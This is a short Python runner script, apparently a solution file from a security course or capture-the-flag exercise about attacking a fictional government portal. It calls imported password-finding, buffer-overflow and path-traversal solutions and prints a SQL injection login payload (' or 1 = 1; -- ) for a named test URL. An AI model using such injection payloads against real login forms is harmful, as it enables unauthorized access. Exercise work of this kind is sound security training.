import time

from infiltrating_the_government_in_an_alternative_universe.solutions.attack_1.main import find_password
from infiltrating_the_government_in_an_alternative_universe.solutions.attack_4.main import buffer_overflow
from infiltrating_the_government_in_an_alternative_universe.solutions.attack_5.main import path_travesal


def main():
    find_password()
    print("Second attack is SQL injection. Sign in to https://inner.portal.regjeringen.uiaikt.no/login?next=%2F "
          "with the following credentials:")
    time.sleep(2)
    print("Username: jonas.dahl")
    print("Password: ' or 1 = 1; -- ")
    time.sleep(5)
    print("Third attack is Stored XSS. For instructions on how to perform this attack, see the report.")
    time.sleep(5)
    buffer_overflow()
    path_travesal()

